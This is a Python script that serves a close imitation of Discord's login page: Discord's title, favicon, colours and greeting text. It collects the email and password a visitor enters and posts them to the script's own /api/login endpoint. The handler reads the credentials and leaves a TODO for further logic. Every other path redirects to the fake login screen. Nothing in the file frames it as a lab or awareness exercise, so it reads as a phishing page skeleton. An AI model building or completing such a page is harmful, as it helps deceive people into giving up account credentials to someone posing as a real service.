import os
import json
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn

HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Discord - Login</title>
<link rel="icon" href="https://discord.com/assets/favicon.ico">
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');

*{margin:0;padding:0;box-sizing:border-box}

:root{
  --bg:#313338;
  --bg-dark:#1e1f22;
  --bg-darker:#111214;
  --text-white:#f2f3f5;
  --text-muted:#b5bac1;
  --text-gray:#949ba4;
  --blurple:#5865f2;
  --blurple-hover:#4752c4;
  --link:#00a8fc;
  --input-bg:#1e1f22;
}

html,body{
  height:100%;
  width:100%;
  font-family:'Inter','gg sans','Noto Sans',Helvetica,Arial,sans-serif;
  background:var(--bg);
  color:var(--text-white);
  overflow:hidden;
}

/* Subtle geometric background pattern */
body::before{
  content:'';
  position:fixed;
  inset:0;
  z-index:0;
  background:
    radial-gradient(ellipse 300px 300px at 0% 0%, rgba(88,101,242,0.08) 0%, transparent 70%),
    radial-gradient(ellipse 250px 250px at 100% 15%, rgba(88,101,242,0.06) 0%, transparent 70%),
    radial-gradient(ellipse 200px 200px at 85% 60%, rgba(88,101,242,0.05) 0%, transparent 70%),
    radial-gradient(ellipse 280px 280px at 10% 80%, rgba(88,101,242,0.06) 0%, transparent 70%),
    radial-gradient(ellipse 180px 180px at 50% 30%, rgba(88,101,242,0.04) 0%, transparent 70%);
  pointer-events:none;
}

/* Decorative circles */
body::after{
  content:'';
  position:fixed;
  inset:0;
  z-index:0;
  background:
    radial-gradient(circle 80px at 92% 12%, rgba(255,255,255,0.015) 0%, rgba(255,255,255,0.015) 100%, transparent 100%),
    radial-gradient(circle 120px at 88% 55%, rgba(255,255,255,0.012) 0%, rgba(255,255,255,0.012) 100%, transparent 100%),
    radial-gradient(circle 60px at 5% 25%, rgba(255,255,255,0.015) 0%, rgba(255,255,255,0.015) 100%, transparent 100%),
    radial-gradient(circle 90px at 8% 75%, rgba(255,255,255,0.012) 0%, rgba(255,255,255,0.012) 100%, transparent 100%),
    radial-gradient(circle 50px at 50% 5%, rgba(255,255,255,0.01) 0%, rgba(255,255,255,0.01) 100%, transparent 100%);
  pointer-events:none;
}

.container{
  position:relative;
  z-index:1;
  width:100%;
  height:100%;
  display:flex;
  flex-direction:column;
  padding:16px 24px 40px;
  max-width:480px;
  margin:0 auto;
}

/* Back arrow */
.back-arrow{
  display:flex;
  align-items:center;
  justify-content:center;
  width:36px;
  height:36px;
  cursor:pointer;
  margin-bottom:24px;
  margin-left:-4px;
}
.back-arrow svg{
  width:22px;
  height:22px;
  fill:none;
  stroke:var(--text-muted);
  stroke-width:2.5;
  stroke-linecap:round;
  stroke-linejoin:round;
}
.back-arrow:hover svg{
  stroke:var(--text-white);
}

/* Header */
.header{
  text-align:center;
  margin-bottom:28px;
}
.header h1{
  font-size:26px;
  font-weight:800;
  color:var(--text-white);
  margin-bottom:8px;
  letter-spacing:-0.2px;
}
.header p{
  font-size:15px;
  color:var(--text-muted);
  font-weight:400;
  line-height:1.3;
}

/* Form */
.form-group{
  margin-bottom:20px;
}
.form-group label{
  display:block;
  font-size:14px;
  font-weight:600;
  color:var(--text-muted);
  margin-bottom:10px;
  letter-spacing:0.02em;
}
.input-wrapper{
  position:relative;
  width:100%;
}
.form-group input{
  width:100%;
  height:52px;
  background:var(--input-bg);
  border:none;
  border-radius:18px;
  padding:0 20px;
  font-size:16px;
  color:var(--text-white);
  font-family:inherit;
  outline:none;
  transition:box-shadow 0.15s;
  -webkit-appearance:none;
}
.form-group input::placeholder{
  color:var(--text-gray);
  opacity:0.5;
}
.form-group input:focus{
  box-shadow:0 0 0 2px var(--blurple);
}

/* Eye toggle */
.eye-toggle{
  position:absolute;
  right:16px;
  top:50%;
  transform:translateY(-50%);
  cursor:pointer;
  padding:4px;
  display:flex;
  align-items:center;
  justify-content:center;
}
.eye-toggle svg{
  width:22px;
  height:22px;
  fill:none;
  stroke:var(--text-gray);
  stroke-width:1.8;
  stroke-linecap:round;
  stroke-linejoin:round;
}
.eye-toggle:hover svg{
  stroke:var(--text-muted);
}

/* Forgot password */
.forgot-link{
  display:inline-block;
  margin-top:8px;
  font-size:14px;
  font-weight:500;
  color:var(--link);
  text-decoration:none;
  cursor:pointer;
}
.forgot-link:hover{
  text-decoration:underline;
}

/* Log In button */
.login-btn{
  width:100%;
  height:52px;
  border:none;
  border-radius:26px;
  background:var(--blurple);
  color:#fff;
  font-size:16px;
  font-weight:600;
  font-family:inherit;
  cursor:pointer;
  margin-top:24px;
  transition:background 0.15s, transform 0.1s;
  letter-spacing:0.02em;
}
.login-btn:hover{
  background:var(--blurple-hover);
}
.login-btn:active{
  transform:scale(0.98);
}

/* Loading dots */
.login-btn.loading{
  pointer-events:none;
  color:transparent;
  position:relative;
}
.login-btn.loading::after{
  content:'';
  position:absolute;
  left:50%;top:50%;
  width:8px;height:8px;
  margin:-4px 0 0 -20px;
  border-radius:50%;
  background:#fff;
  animation:dots 1.2s infinite;
}
@keyframes dots{
  0%,80%,100%{box-shadow:12px 0 0 #fff,24px 0 0 #fff}
  40%{box-shadow:12px -6px 0 #fff,24px 0 0 #fff}
  60%{box-shadow:12px 0 0 #fff,24px -6px 0 #fff}
}

/* Passkey link */
.passkey-link{
  display:block;
  text-align:center;
  margin-top:20px;
  font-size:14px;
  font-weight:500;
  color:var(--link);
  text-decoration:none;
  cursor:pointer;
}
.passkey-link:hover{
  text-decoration:underline;
}

/* Desktop: center the form nicely */
@media(min-width:481px){
  .container{
    justify-content:center;
    padding-top:60px;
  }
}
</style>
</head>
<body>

<div class="container">

  <!-- Back Arrow -->
  <div class="back-arrow" onclick="history.back()">
    <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>
  </div>

  <!-- Header -->
  <div class="header">
    <h1>Welcome back!</h1>
    <p>We're so excited to see you again!</p>
  </div>

  <!-- Form -->
  <form id="loginForm" onsubmit="return handleLogin(event)">

    <div class="form-group">
      <label>Email or Phone Number</label>
      <div class="input-wrapper">
        <input type="text" id="email" autocomplete="username" autocapitalize="none" spellcheck="false">
      </div>
    </div>

    <div class="form-group">
      <label>Password</label>
      <div class="input-wrapper">
        <input type="password" id="password" autocomplete="current-password">
        <div class="eye-toggle" onclick="togglePassword()">
          <svg id="eyeIcon" viewBox="0 0 24 24">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
        </div>
      </div>
      <a class="forgot-link" href="#">Forgot your password?</a>
    </div>

    <button type="submit" class="login-btn" id="loginBtn">Log In</button>

  </form>

  <a class="passkey-link" href="#">Or, sign in with passkey</a>

</div>

<script>
function togglePassword(){
  const p=document.getElementById('password');
  const eye=document.getElementById('eyeIcon');
  if(p.type==='password'){
    p.type='text';
    eye.innerHTML='<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
  }else{
    p.type='password';
    eye.innerHTML='<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/><circle cx="12" cy="12" r="3"/>';
  }
}

function handleLogin(e){
  e.preventDefault();
  const btn=document.getElementById('loginBtn');
  const email=document.getElementById('email').value;
  const password=document.getElementById('password').value;
  if(!email||!password)return false;
  btn.classList.add('loading');
  fetch('/api/login',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({email,password})
  }).then(r=>r.json()).then(d=>{
    btn.classList.remove('loading');
    // Handle response
  }).catch(()=>{
    btn.classList.remove('loading');
  });
  return false;
}
</script>

</body>
</html>"""


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" or self.path == "/login":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(HTML.encode("utf-8"))
        else:
            self.send_response(301)
            self.send_header("Location", "/")
            self.end_headers()

    def do_POST(self):
        if self.path == "/api/login":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length)
            data = json.loads(body) if body else {}
            email = data.get("email", "")
            password = data.get("password", "")
            # TODO: add your own authentication logic here
            response = json.dumps({"status": "ok", "message": "Login endpoint reached"})
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(response.encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        print(f"[{self.log_date_time_string()}] {format % args}", flush=True)


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    server = ThreadedHTTPServer(("0.0.0.0", port), Handler)
    print(f"Server running on port {port}", flush=True)
    sys.stdout.flush()
    server.serve_forever()
